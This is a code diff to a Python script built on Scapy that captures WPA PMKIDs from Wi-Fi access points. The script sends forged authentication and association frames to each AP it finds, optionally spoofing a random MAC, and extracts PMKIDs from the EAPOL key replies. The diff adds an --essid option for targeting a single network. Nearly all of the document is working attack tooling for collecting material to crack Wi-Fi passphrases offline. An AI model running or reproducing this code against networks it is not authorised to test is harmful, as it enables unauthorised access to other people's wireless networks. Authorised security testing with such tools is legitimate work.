@@ -2,10 +2,7 @@
 
 import argparse
 import binascii
-# import packetEssentials as PE
-# import quickset as qs
 import sys
-# from easyThread import Backgrounder
 import threading
 from scapy.all import *
 
@@ -19,8 +16,8 @@ class Shared(object):
                  'bH',
                  'bkts',
                  'pkts']
-    def __init__(self, args):
 
+    def __init__(self, args):
         self.beaconSet = set()
         self.args = args
         self.capSet = set()
@@ -32,16 +29,17 @@ class Shared(object):
     def beaconHandler(self):
         """Parse which PMKIDs have been gathered and only ask once."""
         def snarf(packet):
-            if packet[Dot11].addr2 not in self.beaconSet:
-                if len(packet[Dot11Elt].info) > 0:
-                    self.essidDict.update({packet[Dot11].addr2: packet[Dot11Elt].info})
+            if self.args.essid is None or self.args.essid == packet[Dot11Elt].info.decode():
+                if packet[Dot11].addr2 not in self.beaconSet:
+                    if len(packet[Dot11Elt].info) > 0:
+                        self.essidDict.update({packet[Dot11].addr2: packet[Dot11Elt].info})
 
-                    ## Active sniffing assist
-                    if self.args.f is None:
-                        self.pmkAsk(self.args.i, packet[Dot11].addr2, packet[Dot11Elt].info)
+                        ## Active sniffing assist
+                        if self.args.f is None:
+                            self.pmkAsk(self.args.i, packet[Dot11].addr2, packet[Dot11Elt].info)
 
-                    ## This prevents firing more than once
-                    self.beaconSet.add(packet[Dot11].addr2)
+                        ## This prevents firing more than once
+                        self.beaconSet.add(packet[Dot11].addr2)
         return snarf
 
 
@@ -55,16 +53,11 @@ class Shared(object):
         Based on experimentation with hcxdumptool
         """
         if self.args.random is True:
-            # qs.sh.macTx = RandMAC()._fix()
             macTx = RandMAC()._fix()
         else:
-            # qs.sh.macTx = 'a0:12:34:56:78:90'
             macTx = 'a0:12:34:56:78:90'
-        # qs.sh.macRx = tgtMac
         macRx = tgtMac
-        # qs.sh.essid = tgtEssid
         essid = tgtEssid
-        # auth1 = qs.supplicants.authenticate()
         auth1 = RadioTap()\
                 /Dot11(type = 0,
                        subtype = 11,
@@ -74,7 +67,6 @@ class Shared(object):
                 /Dot11Auth(algo = 0,
                            seqnum = 1)
         auth1[Dot11].SC = 16
-        # auth2 = qs.supplicants.authenticate()
         auth2 = RadioTap()\
                 /Dot11(type = 0,
                        subtype = 11,
@@ -84,8 +76,6 @@ class Shared(object):
                 /Dot11Auth(algo = 0,
                            seqnum = 1)
         auth2[Dot11].SC = 32
-        # ourAssc = qs.supplicants.associate()\
-        #           /Dot11EltRSN(binascii.unhexlify('30140100000FAC040100000FAC040100000FAC020C00'))
         ourAssc = RadioTap()\
                   /Dot11(type = 0,
                          subtype = 0,
@@ -98,32 +88,29 @@ class Shared(object):
                   /Dot11EltRates(ID = 50, rates = [48, 72, 96, 108])\
                   /Dot11EltRSN(binascii.unhexlify('30140100000FAC040100000FAC040100000FAC020C00'))
         ourAssc[Dot11].SC = 48
-        sendp([auth1, auth2, ourAssc], iface = iFace, inter = 1, verbose = False)
+        print(f'[~] Creating attempt for {tgtEssid}')
+        sendp([auth1, auth2, ourAssc], iface = iFace, verbose = False)
 
 
 def pmkRip(packet):
     """Attempt to rip the PMKID"""
     try:
-        # pmkid = PE.pt.byteRip(packet[Raw].load,
-        #                       order = 'last',
-        #                       qty = 16,
-        #                       compress = True)
-        stream = hexstr(packet[Raw].load, onlyhex = 1).split(' ')
-        pmkid = ' '.join(stream[len(stream) - 16:]).replace(' ', '')
-        if pmkid[-1] != 0:
-            return pmkid
+        if packet[EAPOL_KEY].key_mic == b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00':
+            if packet[EAPOL_KEY].key_data != b'':
+                return ''.join(hexstr(packet[EAPOL_KEY].key_data, onlyhex = 1).split()[-16:])
+            else:
+                return False
         else:
             return False
     except Exception as E:
-        print(E)
         return False
 
 
 def lFilter():
     """Filter Handler"""
     def snarf(packet):
-        if packet.haslayer(EAPOL):
-            if packet[EAPOL].version == 2:
+        if packet.haslayer(EAPOL_KEY):
+            if packet[Dot11].addr2 not in sh.capSet:
                 return True
     return snarf
 
@@ -131,10 +118,10 @@ def lFilter():
 def packetHandler(sh):
     """Packet Handler"""
     def snarf(packet):
-        if packet[Dot11].addr2 not in sh.capSet:
-            pmkID = pmkRip(packet)
-            if pmkID is not False:
-                if '00000000000000000000000000000000' != pmkID:
+        try:
+            if sh.args.essid is None or sh.args.essid == sh.essidDict.get(packet[Dot11].addr2).decode():
+                pmkID = pmkRip(packet)
+                if pmkID is not False:
 
                     ## ESSID MAC: packet
                     sh.pmkDict.update({packet[Dot11].addr2: packet})
@@ -165,8 +152,12 @@ def packetHandler(sh):
                             ## Update capture set
                             sh.capSet.add(packet[Dot11].addr2)
 
-                        except Exception as e:
-                            print(f'\n\n{e}\nError on line {sys.exc_info()[-1].tb_lineno}')
+                        except Exception as E:
+                            print(f'\n\n{E}')
+        
+        ## Silently error on non-existent ESSID
+        except AttributeError as E:
+            pass
     return snarf
 
 
@@ -191,10 +182,7 @@ def main(sh, args):
     ## Live
     if args.i is not None:
 
-        ## Background Beacon sniffing
-        # Backgrounder.theThread = sh.beaconBackgrounder
-        # bg = Backgrounder()
-        # bg.easyLaunch()
+        ## Beacon threading
         theThread = threading.Thread(target = sh.beaconBackgrounder)
         theThread.daemon = True
         theThread.start()
@@ -213,6 +201,7 @@ if __name__ == '__main__':
     group = parser.add_mutually_exclusive_group(required = True)
     group.add_argument('-f', help = 'PCAP to parse', metavar = '<capture file>',)
     group.add_argument('-i', help = 'Interface to sniff on', metavar = '<sniff nic>')
+    parser.add_argument('--essid', help = 'Target ESSID')
     parser.add_argument('--random', action = 'store_true', help = 'Random MAC for Tx')
     args = parser.parse_args()
     sh = Shared(args)
